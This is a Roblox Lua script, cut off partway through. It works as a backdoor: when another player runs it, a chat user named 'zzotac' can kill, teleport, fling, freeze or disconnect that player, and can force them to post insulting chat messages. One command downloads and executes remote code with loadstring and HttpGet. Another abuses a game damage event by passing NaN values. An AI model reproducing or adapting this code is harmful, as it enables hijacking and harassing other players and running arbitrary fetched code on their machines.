local Players = game:GetService("Players")
local plrr = "zzotac"
local plrr2 = game.Players.zzotac
local target = game.Players.zzotac
local event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
cmd1 = ".kill"
cmd2 = ".bring"
cmd3 = ".rejoin"
cmd4 = ".fling"
cmd5 = ".kick"
cmd6 = ".test"
cmd7 = ".godmode"
cmd8 = ".t"
cmd9 = ".freeze"
cmd10 = ".unfreeze"
cmd11 = ".ki"

if game.Players.LocalPlayer.Name ~= plrr then
	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd1 then
				game.Players.LocalPlayer.Character.Humanoid.Health = 0

			end
		end
	end)

	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd2 then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = plrr2.Character.HumanoidRootPart.CFrame

			end
		end
	end)

	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd3 then
				loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/rejoin'))()

			end
		end
	end)

	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd4 then
				game:getService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2722238.6643066406, 4862221.3525390625, -27222274.0993652344)

			end
		end
	end)

	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd5 then
				game:Shutdown()

			end
		end
	end)

	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd6 then
				-- Script generated by SimpleSpy - credits to exx#9394

				local args = {
					[1] = "Im a noob",
					[2] = "All"
				}

				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))


			end
		end
	end)

	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd7 then
				local Players = game:GetService("Players")
				local function RemoveSpaces(String)
					return String:gsub("%s+", "") or String
				end

				local function FindPlayer(String)
					String = RemoveSpaces(String)
					for _, _Player in pairs(Players:GetPlayers()) do
						if _Player.Name:lower():match('^'.. String:lower()) then
							return _Player
						end
					end
					return nil
				end

				targetname = game.Players.LocalPlayer.Name

				for i=1,1 do
					wait(0.1)

					local tbl_main = 
						{
							"Knockback", 
							-math.huge / -math.huge,  --50 
							game:GetService("Workspace")[targetname].Humanoid, 
							game:GetService("Workspace")[targetname].HumanoidRootPart, 
							game:GetService("Workspace")[targetname].Effects, 
							game:GetService("Workspace")[targetname].RightHand, 
						}
					game:GetService("ReplicatedStorage").Events.dmg:FireServer(unpack(tbl_main))
				end
				targetname = game.Players.LocalPlayer.Name

				for i=1,1 do
					wait(0.1)


					local tbl_main = 
						{
							"Knockback", 
							-math.huge / -math.huge,  --50 
							game:GetService("Workspace")[targetname].Humanoid, 
							game:GetService("Workspace")[targetname].HumanoidRootPart, 
							game:GetService("Workspace")[targetname].Effects, 
							game:GetService("Workspace")[targetname].RightHand, 
						}
					game:GetService("ReplicatedStorage").Events.dmg:FireServer(unpack(tbl_main))
				end





			end
		end
	end)
		event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd8 then
        local args = {
            [1] = "Im gay",
            [2] = "All"
        }
        
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))


			end
		end
		end)
		event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd9 then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true

			end
		end
		end)
				event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
			if click.Message == cmd10 then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false

			end
		end
				end)
	
		event.OnMessageDoneFiltering.OnClientEvent:Connect(function(click)
		if click.FromSpeaker == plrr then
